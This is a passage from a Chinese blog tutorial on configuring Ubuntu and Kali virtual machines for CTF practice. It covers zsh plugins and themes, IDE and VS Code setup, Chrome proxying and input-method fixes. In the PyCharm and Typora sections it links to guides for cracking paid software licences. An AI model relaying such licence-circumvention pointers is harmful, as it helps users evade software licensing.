src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA20.png" alt="Linux虚拟机CTF环境搭建20.png"></p><p>灰色部分就是终端历史命令自动补全，与 Kali 终端一样</p><hr><h2 id="配置-zsh-syntax-highlighting"><a href="#配置-zsh-syntax-highlighting" class="headerlink" title="配置 zsh-syntax-highlighting"></a>配置 zsh-syntax-highlighting</h2><blockquote><p>语法高亮插件，当在终端输入命令时，这个插件可以帮助纠错，命令为红色代表错误，绿色代表正确</p></blockquote><p>方法和配置 <code>zsh-autosuggestions</code> 一样</p><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>plugins</code>，在 plugins 后面添加插件 <code>zsh-syntax-highlighting</code> （空格隔开）</p><p>并加入插件 <code>zsh-syntax-highlighting</code> 的默认保存地址：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">plugins</span><span class="token operator">=</span><span class="token punctuation">(</span>git zsh-autosuggestions zsh-syntax-highlighting<span class="token punctuation">)</span><span class="token builtin class-name">source</span> /usr/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA21.png" alt="Linux虚拟机CTF环境搭建21.png"></p><p>将插件克隆到本地：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">git</span> clone https://github.com/zsh-users/zsh-syntax-highlighting.git ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 <code>zsh-syntax-highlighting</code> 后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA22.png" alt="Linux虚拟机CTF环境搭建22.png"></p><p>命令为绿色代表正确，红色代表输入错误</p><hr><h2 id="更换-ZSH-终端主题"><a href="#更换-ZSH-终端主题" class="headerlink" title="更换 ZSH 终端主题"></a>更换 ZSH 终端主题</h2><blockquote><p>zsh 终端自带很多不同风格的主题，可以根据自己的喜好更换</p></blockquote><p>查看 <code>zsh</code> 自带的主题：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/.oh-my-zsh/themes <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA24.png" alt="Linux虚拟机CTF环境搭建24.png"></p><p>打开 <code>zsh</code> 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>搜索 <code>ZSH_THEME</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA23.png" alt="Linux虚拟机CTF环境搭建23.png"></p><p>默认主题是 <code>robbyrussell</code>，可以根据个人喜好自行修改</p><p>如果设置为：<code>ZSH_THEME=&quot;random&quot;</code>，则每次打开终端时，主题都是随机的</p><p>如果不知道选哪个主题好，也可以先将主题设置为随机，然后每次打开 <code>zsh</code> 后都会显示：<br><code>[oh-my-zsh] Random theme &#39;xxx&#39; loaded</code><br>其中 <code>xxx</code> 就是该主题的名字，遇到喜欢的，就将其加到 <code>ZSH_THEME</code> 中</p><p>修改好后，更新 <code>~/.zshrc</code> 使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以下主题样式可供参考：</p><ol><li><code>af-magic</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%981.png" alt="ZSH终端主题1.png"></p><ol start="2"><li><code>bira</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%982.png" alt="ZSH终端主题2.png"></p><ol start="3"><li><code>fox</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%983.png" alt="ZSH终端主题3.png"></p><ol start="4"><li><code>xiong-chiamiov</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%984.png" alt="ZSH终端主题4.png"></p><ol start="5"><li><code>gianu</code></li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ZSH%E7%BB%88%E7%AB%AF%E4%B8%BB%E9%A2%985.png" alt="ZSH终端主题5.png"></p><blockquote><p>更多主题请查看：<a href="https://github.com/ohmyzsh/ohmyzsh/wiki/themes#pygmalion">Themes · ohmyzsh&#x2F;ohmyzsh Wiki (github.com)</a></p></blockquote><hr><h2 id="切换-shell-终端"><a href="#切换-shell-终端" class="headerlink" title="切换 shell 终端"></a>切换 shell 终端</h2><p>查看系统已安装的 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /etc/shells<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前使用的 shell：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token environment constant">$SHELL</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>临时切换 shell：</li></ol><p>直接输入 shell 的名称即可，切换 zsh 就终端输入 zsh，切换 bash 就终端输入 bash</p><ol start="2"><li>永久切换 shell：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 将终端永久切换为 zsh</span><span class="token function">sudo</span> chsh <span class="token parameter variable">-s</span> /bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h1 id="编辑器和-IDE"><a href="#编辑器和-IDE" class="headerlink" title="编辑器和 IDE"></a>编辑器和 IDE</h1><h2 id="安装-Pycharm-x2F-CLion"><a href="#安装-Pycharm-x2F-CLion" class="headerlink" title="安装 Pycharm&#x2F;CLion"></a>安装 Pycharm&#x2F;CLion</h2><blockquote><p>如果不想用了，可以参照官方卸载方法：<a href="https://www.jetbrains.com/help/pycharm/uninstall.html">卸载 PyCharm | PyCharm 文档 (jetbrains.com)</a></p><p>如果想安装专业版，参考文章：</p><ol><li><a href="https://www.exception.site/essay/how-to-free-use-intellij-idea-2019-3">IntelliJ IDEA 2023.3.2最新激活破解教程（永久激活，亲测有效） - 异常教程</a></li><li><a href="https://idea.javatiku.cn/">免费提供最新IDEA注册码, IDEA专属激活码, IDEA注册码在线生成</a></li></ol><p><strong>仅供学习交流，请支持正版</strong></p></blockquote><p>打开 Pycharm 后，如果界面显示异常，比如各种按键的方框显示不全：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA5.png" alt="Linux虚拟机CTF环境搭建5.png"></p><p><strong>一般虚拟机中的各种显示问题 bug，都和 VM 的 3D 图形加速有关</strong>，关掉即可正常显示：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA6.png" alt="Linux虚拟机CTF环境搭建6.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA7.png" alt="Linux虚拟机CTF环境搭建7.png"></p><hr><h3 id="Ubuntu-22-04-1"><a href="#Ubuntu-22-04-1" class="headerlink" title="Ubuntu 22.04"></a>Ubuntu 22.04</h3><blockquote><p>这里通过命令行安装，也可以直接在应用商店里面安装</p></blockquote><p>以 Pycharm 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> snap <span class="token function">install</span> pycharm-professional/pycharm-community<span class="token punctuation">(</span>选其一<span class="token punctuation">)</span> <span class="token parameter variable">--classic</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：CLion 只有专业版，没有免费的社区版</p></blockquote><p>当然也可以参照下面 Kali 的方法自己通过安装包安装 （好处是可以自己指定版本）</p><hr><h3 id="Kali-2022-4-1"><a href="#Kali-2022-4-1" class="headerlink" title="Kali 2022.4"></a>Kali 2022.4</h3><p>官网下载 Linux 版：<a href="https://www.jetbrains.com/pycharm/download/?section=linux">Download PyCharm: Python IDE for Professional Developers by JetBrains</a></p><p>以 pycharm-community-2022.1.1.tar.gz 为例（专业版同理）</p><p>解压并移动到 <code>/opt</code> 下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> pycharm-community-2022.1.1.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> pycharm-community-2022.1.1 /opt/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解压后进入 Pycharm 的 bin 目录，运行 Pycharm：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /opt/pycharm-community-2022.1.1/bin<span class="token function">sudo</span> ./pycharm.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行软件后：<code>工具栏 –&gt; Tools –&gt; Create Desktop Entery</code> 可以创建桌面快捷方式，并将图标加入开始菜单</p><hr><h2 id="安装-VScode"><a href="#安装-VScode" class="headerlink" title="安装 VScode"></a>安装 VScode</h2><blockquote><p>感觉不是很好用，作为编辑器还是不错的，用来写代码不错，但是使用 VScode 运行代码可能会有各种小问题需要解决<br>比如：文件相对路径问题（已解决）、gdb.attach 附加调试的终端问题（未解决）等等</p></blockquote><h3 id="Ubuntu-22-04-2"><a href="#Ubuntu-22-04-2" class="headerlink" title="Ubuntu 22.04"></a>Ubuntu 22.04</h3><blockquote><p>Ubuntu 可以直接在应用商店里安装，软件名为：code</p></blockquote><hr><h3 id="Kali-2022-4-2"><a href="#Kali-2022-4-2" class="headerlink" title="Kali 2022.4"></a>Kali 2022.4</h3><p>安装软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">curl</span> gpg software-properties-common apt-transport-https<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>导入 Microsoft GPG 密钥：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-sSL</span> https://packages.microsoft.com/keys/microsoft.asc <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>添加 VS Code APT 存储库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"deb [arch=amd64] https://packages.microsoft.com/repos/vscode stable main"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/vscode.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装 Visual Studio Code：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update  <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> code<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="配置-C-x2F-C"><a href="#配置-C-x2F-C" class="headerlink" title="配置 C&#x2F;C++"></a>配置 C&#x2F;C++</h3><blockquote><p>首先要安装好 <code>gcc</code>、<code>g++</code>、<code>gdb</code> 环境</p></blockquote><p>安装 <code>C/C++</code> 和 <code>Code Runner</code> 插件</p><p>使用 VScode 调试：<br>新建 <code>.vscode</code> 文件夹，在 <code>.vscode</code> 文件夹下新建两个文件：<code>launch.json</code> 和 <code>tasks.json</code></p><p><strong>以后在其他的文件夹中要调试都要重建 <code>.vscode</code> 子文件夹并配置</strong></p><ul><li><code>launch.json</code> 内容：</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"C/C++"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>tasks.json</code> 内容：</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"compile"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"g++"</span><span class="token punctuation">,</span>   <span class="token comment">// c 文件为 gcc, cpp 文件为 g++</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"owner"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>                <span class="token property">"fileLocation"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                    <span class="token string">"relative"</span><span class="token punctuation">,</span>                    <span class="token string">"$&#123;workspaceRoot&#125;"</span>                <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token property">"pattern"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                    <span class="token property">"regexp"</span><span class="token operator">:</span> <span class="token string">"^(.*):(\\d+):(\\d+):\\s+(warning|error):\\s+(.*)$"</span><span class="token punctuation">,</span>                    <span class="token property">"file"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                    <span class="token property">"line"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>                    <span class="token property">"column"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>                    <span class="token property">"severity"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>                    <span class="token property">"message"</span><span class="token operator">:</span> <span class="token number">5</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="配置-Python"><a href="#配置-Python" class="headerlink" title="配置 Python"></a>配置 Python</h3><blockquote><p>首先要安装好 <code>python</code> 环境</p></blockquote><p>安装插件 <code>Code Runner</code> 即可，其他插件：<code>Pylance</code>、<code>Python</code></p><p><code>Code Runner</code> 插件的代码运行指令可在 <code>扩展 -&gt; Code Runner -&gt; 扩展设置 -&gt; Code-runner: Executor Map -&gt; 在 settings.json 中编辑</code> 进行自定义</p><hr><h3 id="使用和一些问题"><a href="#使用和一些问题" class="headerlink" title="使用和一些问题"></a>使用和一些问题</h3><blockquote><p>如果是从 snap 商店安装的 VScode 可以直接使用，如果是自己通过 .deb 包安装，可能需要将 code 添加到环境变量</p></blockquote><p>从终端打开 VScode：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 VScode 创建文件并编辑： （类似于 VIM）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">code 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：<br><strong>在 VScode 中使用绝对路径一般没问题，但是使用相对路径 <code>./</code> 可能会出问题</strong><br>这并不是路径错了，而是 <em>VScode 默认的相对路径是针对 <code>.vscode</code> 文件夹所在的目录，而不是当前编辑的文件所在目录</em><br><em><code>.vscode</code> 文件夹默认放置在用户家目录下：<code>~/</code></em></p></blockquote><p>解决办法：</p><ul><li>打开 VScode 设置，在 <code>Code Runner</code> 插件中搜索：<code>File Directory As Cwd</code>，将下面的选项打上勾，重新打开编辑的文件，即可正常</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA2.png" alt="Linux虚拟机CTF环境搭建2.png"></p><ul><li>如果不使用 <code>Code Runner</code>，而是直接使用 <code>Python</code> 插件，则在 <code>Python</code> 插件中搜索：<code>Execute ln File Dir</code>，将下面的选项打上勾，重新打开编辑的文件，即可正常</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA4.png" alt="Linux虚拟机CTF环境搭建4.png"></p><hr><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="安装-Chrome-浏览器"><a href="#安装-Chrome-浏览器" class="headerlink" title="安装 Chrome 浏览器"></a>安装 Chrome 浏览器</h2><blockquote><p>众所周知，“Chrome 是世界上最好的浏览器” （手动狗头）</p></blockquote><h3 id="Ubuntu-22-04-3"><a href="#Ubuntu-22-04-3" class="headerlink" title="Ubuntu 22.04"></a>Ubuntu 22.04</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb<span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> google-chrome-stable_current_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><h3 id="Kali-2022-4-3"><a href="#Kali-2022-4-3" class="headerlink" title="Kali 2022.4"></a>Kali 2022.4</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb<span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> google-chrome-stable_current_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装过程中会报错，显示缺少 <code>libu2f-udev</code><br>直接 apt 安装 （如果还缺其他的，同理安装即可）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libu2f-udev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在主菜单中搜索 Chrome，单击即可正常打开 Chrome 浏览器</p><p>但是这时如果 Kali 2022.4 没有配置全局代理 （终端的代理不算），会发现 Chrome 无法走代理，也就无法使用 Google 的服务了</p><p>这时候只需打开主菜单，搜索 Chrome，<code>右键 --&gt; 编辑应用程序</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA27.png" alt="Linux虚拟机CTF环境搭建27.png"></p><p>然后在“命令”一栏的最后，加上参数：<code>-proxy-server=&quot;xxx&quot;</code> （记得与前面的参数之间加上一个空格隔开），其中 xxx 就是你的代理服务器地址</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA26.png" alt="Linux虚拟机CTF环境搭建26.png"></p><p>然后重新打开 Chrome，就可以连接上代理啦</p><hr><h2 id="安装搜狗输入法"><a href="#安装搜狗输入法" class="headerlink" title="安装搜狗输入法"></a>安装搜狗输入法</h2><h3 id="Ubuntu-22-04-4"><a href="#Ubuntu-22-04-4" class="headerlink" title="Ubuntu 22.04"></a>Ubuntu 22.04</h3><blockquote><p>下载 Linux 版搜狗输入法：<a href="https://shurufa.sogou.com/linux">搜狗输入法linux-首页 (sogou.com)</a></p><ol><li>官方安装步骤：<a href="https://shurufa.sogou.com/linux/guide">搜狗输入法linux-安装指导 (sogou.com)</a>  </li><li>参考安装步骤：<a href="https://blog.csdn.net/mr_sudo/article/details/124874239">Ubuntu 22.04安装搜狗输入法_ubuntu22搜狗输入法_Mr_Sudo的博客-CSDN博客</a></li></ol></blockquote><p><strong>2023 年底，我发现我 Ubuntu 22.04 虚拟机上的搜狗输入法突然无法正常使用，无论如何都无法切换出中文输入，之前一切正常，不知道是否是系统更新或是其他未知 bug 的缘故，问题版本为 V4.2.1</strong></p><p>猜测是 fcitx 出现问题，如果你遇到和我一样的问题，可以按照下述操作来解决，但如果使用 fcitx4 后搜狗输入法仍然无法正常使用（我就是），那可能只能暂时使用 fcitx5 了</p><blockquote><p>目前在 2024 年 4 月找到了一种解决上述问题的方法：</p><p>在 <code>/etc/environment</code> 文件中添加如下内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">GTK_IM_MODULE</span><span class="token operator">=</span>fcitx  <span class="token assign-left variable">QT_IM_MODULE</span><span class="token operator">=</span>fcitx  <span class="token assign-left variable"><span class="token environment constant">XMODIFIERS</span></span><span class="token operator">=</span>@im<span class="token operator">=</span>fcitx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>重启后即可切换出中文输入法，搜狗输入法也可以正常使用了</p><p>无法切换出中文输入的具体原因还是未知，网上一堆方法也都没有作用，但终于是折腾好了</p></blockquote><p>删除所有输入框架：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> purge fcitx* ibus*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新安装 fcitx4：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> fcitx<span class="token comment"># 如果出现报错：sudo apt install -f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或者安装 fcitx5（与 fcitx4 选其一即可）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> fcitx5 fcitx5-*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：fcitx5 和搜狗输入法是不能共存的，因此只需要选择 <u>fcitx4 + 搜狗输入法</u> 或者 <u>fcitx5</u> 的组合之一就行</p><p>fcitx5 自带的输入法如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA28.png" alt="Linux虚拟机CTF环境搭建28.png"></p><p>安装 <code>gnome-tweaks</code> 来设置 fcitx5 开机自启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gnome-tweaksgnome-tweaks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者也可以直接使用 ibus（与 fcitx4、fcitx5 不共存，选其一）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ibus<span class="token function">sudo</span> im-config <span class="token parameter variable">-s</span> ibus<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ibus-gtk ibus-gtk3<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> ibus-pinyin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>将中文输入法添加到输入源选项中，即可使用</p><hr><h3 id="Kali-2022-4-4"><a href="#Kali-2022-4-4" class="headerlink" title="Kali 2022.4"></a>Kali 2022.4</h3><blockquote><p>下载 Linux 版搜狗输入法：<a href="https://shurufa.sogou.com/linux">搜狗输入法linux-首页 (sogou.com)</a></p><p>参考安装步骤：<a href="https://blog.csdn.net/qq_45722813/article/details/115549664">在kali Linux2021中安装搜狗输入法（详细教程）_kali怎么下载输入法-CSDN博客</a></p></blockquote><hr><h2 id="安装-Typora"><a href="#安装-Typora" class="headerlink" title="安装 Typora"></a>安装 Typora</h2><blockquote><p>参考文章：<a href="https://zhuanlan.zhihu.com/p/636193675">Typora最新版激发（Ubuntu） - 知乎</a></p><p><strong>仅供学习交流，请支持正版</strong></p></blockquote><p>查看电脑架构：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-m</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载对应的 Typora 安装包：</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># x86(amd64)</span><span class="token function">wget</span> 